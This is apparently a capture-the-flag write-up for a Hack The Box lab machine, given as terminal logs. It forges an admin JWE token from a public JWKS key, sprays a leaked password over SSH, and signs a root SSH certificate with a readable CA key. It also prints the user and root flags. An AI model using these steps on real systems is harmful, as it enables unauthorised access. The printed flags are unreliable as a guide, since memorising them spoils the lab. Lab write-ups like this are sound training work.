
<img width="1604" height="357" alt="image" src="https://github.com/user-attachments/assets/79811989-818e-41c5-adc5-0d2a6f85a77a" />




<img width="1673" height="766" alt="image" src="https://github.com/user-attachments/assets/caea0aef-78b6-48bc-a534-3a38476f4b88" />


<img width="1920" height="882" alt="image" src="https://github.com/user-attachments/assets/177c8717-d555-49f0-9ba8-45a3daab0dc1" />


curl -s http://10.129.244.220:8080/dashboard
curl -i  http://10.129.244.220:8080/dashboard


/static/js/app.js

<img width="1221" height="645" alt="image" src="https://github.com/user-attachments/assets/2d321359-6425-47c3-80fa-9c2aeb0df439" />


<img width="1023" height="784" alt="image" src="https://github.com/user-attachments/assets/b552ab2d-05c2-4c2d-9cb8-5ff5bdd83883" />


```
curl -s http://10.129.244.220:8080/static/js/app.js | jq        
jq: parse error: Invalid numeric literal at line 2, column 0

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s http://10.129.244.220:8080/api/auth/jwks | jq        
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"                                                                                                                 
    }
  ]
}

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# nano jwt.py    
  
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# python3 jwt.py http://10.129.244.220:8080      
[*] Fetching JWKS...
[+] Got RSA public key (kid: enc-key-1)
[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN
[+] Forged JWE token created

[*] Accessing /api/dashboard...
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token: eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9.CtVxAlLsldN5-EcoY1EwgGjtR5nrUsLHK5NCFiR_PL0l-f0NX97zsRrxlx6oM1yoi67m9XCDYke5qQQ74XVR3B4pSaL1XuZW1cjo8qC1mDKzqwYPDbGMMdT2B5S08lnlHN0qLhC7I3d6HFs4MuJeJfZ4aGK8BP5BYMQGkdRTWXwtIewUXJAEVQmjr7UDebxhFFiTvLuq-clba7E-Q9c5cRfOpeT3cqqzIGeZ_rjwXoIWD2csv5pZ5mLARkR43LsRE4e3SyPhzxWEbjiWvDnBCZ9eTHU8Ao8TG8VEZIbf8apMfYgSoA69Zo3ycO6b0GwU9zv2ZMWanPmp1ULzWgnETw.9zwQk9hv7J7plZG-.2wNTPGSFq_tKSpouxmYXhHFSxGKC5OfVvZLjVN3tPeblQk78nIZXBEEYrcdDeI5HTR5poGfYQfGULYMa_LOxkmP0O9jKXb2un2tE59jgg1dqz6hwObrGeyqLoT5mJl5DZt71y4ThJPliYwnIlvXoZMdoEUSj4H0CviPdqJMXkmJwimxGM0zShaCZpe6vo50ZXe5vWv51ZsPjI3o33kEabbBM.RZCjMHYYx7iy_Io3MB3nJQ

```

<img width="1909" height="805" alt="image" src="https://github.com/user-attachments/assets/8356f517-ebc1-44d5-95a8-d22a5a75002b" />

<img width="1884" height="714" alt="image" src="https://github.com/user-attachments/assets/fead7268-17e5-447c-804e-2f672a6e144b" />



<img width="1924" height="845" alt="image" src="https://github.com/user-attachments/assets/6de64892-fd7d-4a4f-bb58-30166ed25075" />


```
nxc ssh 10.129.244.220 -u sshuser.txt -p 'D3pl0y_$$H_Now42!'
SSH         10.129.244.220  22     10.129.244.220   [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH         10.129.244.220  22     10.129.244.220   [-] admin:D3pl0y_$$H_Now42!
SSH         10.129.244.220  22     10.129.244.220   [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!

┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# ssh svc-deploy@10.129.244.220                       
The authenticity of host '10.129.244.220 (10.129.244.220)' can't be established.
ED25519 key fingerprint is: SHA256:ibvdsZXiwJ6QUMPTxoH3spRA8hV9mbd98MLpLt3XG/E
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.244.220' (ED25519) to the list of known hosts.
svc-deploy@10.129.244.220's password: 
Permission denied, please try again.
svc-deploy@10.129.244.220's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

svc-deploy@principal:~$ ls
user.txt
svc-deploy@principal:~$ cat user.txt
6a2806e5605b46bac882004c20077d65
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
svc-deploy@principal:~$ pwd
/home/svc-deploy
svc-deploy@principal:~$ ls

```


```
ssh svc-deploy@10.129.244.220 
svc-deploy@10.129.244.220's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jul 29 19:04:31 2026 from 10.10.14.60
svc-deploy@principal:~$ pwd
/home/svc-deploy
svc-deploy@principal:~$ ls -la
total 32
drwxr-x--- 4 svc-deploy svc-deploy 4096 Jul 29 17:43 .
drwxr-xr-x 3 root       root       4096 Mar 11 04:22 ..
-rw-r--r-- 1 svc-deploy svc-deploy    0 Jul 29 17:43 .bash_history
-rw-r--r-- 1 svc-deploy svc-deploy  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 svc-deploy svc-deploy 3771 Mar 31  2024 .bashrc
drwx------ 2 svc-deploy svc-deploy 4096 Mar 11 04:22 .cache
-rw-r--r-- 1 svc-deploy svc-deploy  807 Mar 31  2024 .profile
drwx------ 2 svc-deploy svc-deploy 4096 Mar 11 04:22 .ssh
-rw-r----- 1 root       svc-deploy   33 Jul 29 17:44 user.txt
svc-deploy@principal:~$ cd ../../../opt
svc-deploy@principal:/opt$ ls
containerd  principal
svc-deploy@principal:/opt$ cd principal
svc-deploy@principal:/opt/principal$ ls
app  deploy  ssh
svc-deploy@principal:/opt/principal$ cd ssh
svc-deploy@principal:/opt/principal/ssh$ ls -la
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
svc-deploy@principal:/opt/principal/ssh$ cat README.txt
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
svc-deploy@principal:/opt/principal/ssh$ cat /etc/ssh/sshd_config.d/60-
cat: /etc/ssh/sshd_config.d/60-: No such file or directory
svc-deploy@principal:/opt/principal/ssh$ ls -la /etc/ssh/sshd_config.d/
total 16
drwxr-xr-x 2 root root      4096 Mar 11 04:22 .
drwxr-xr-x 4 root root      4096 Mar 11 04:22 ..
-rw------- 1 root root        27 Mar  2 16:07 50-cloud-init.conf
-rw-r----- 1 root deployers  168 Mar 10 14:35 60-principal.conf
svc-deploy@principal:/opt/principal/ssh$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
Generating public/private ed25519 key pair.
/tmp/pwn already exists.
Overwrite (y/n)? y
Your identification has been saved in /tmp/pwn
Your public key has been saved in /tmp/pwn.pub
The key fingerprint is:
SHA256:ujyqRMhqsuWbmzJB/B0DSogHm2AG+l8XFNITwHY+3VY svc-deploy@principal
The key's randomart image is:
+--[ED25519 256]--+
|B+   .oo+o       |
|B+..  oo+     E  |
|*.. .. o.o . .   |
|.*   o  o.. o    |
|o.+ . + S. .     |
|o. o o o         |
|ooo . .          |
|== o ...         |
|.oB+..o.         |
+----[SHA256]-----+

```


```
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root /tmp/pwn.pub
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid forever
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -L -f /tmp/pwn-cert.pub
/tmp/pwn-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:ujyqRMhqsuWbmzJB/B0DSogHm2AG+l8XFNITwHY+3VY
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using rsa-sha2-512)
        Key ID: "pwn-root"
        Serial: 0
        Valid: forever
        Principals: 
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
svc-deploy@principal:/opt/principal/ssh$ ssh -i /tmp/pwn root@localhost
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@principal:~# ls
root.txt
root@principal:~# cat root.txt
5db70d5e2b1e8b6aa0b38855305b1eb7
root@principal:~# 

```


<img width="1210" height="710" alt="image" src="https://github.com/user-attachments/assets/f95fad16-ca27-49bf-92aa-3d0954a22ced" />

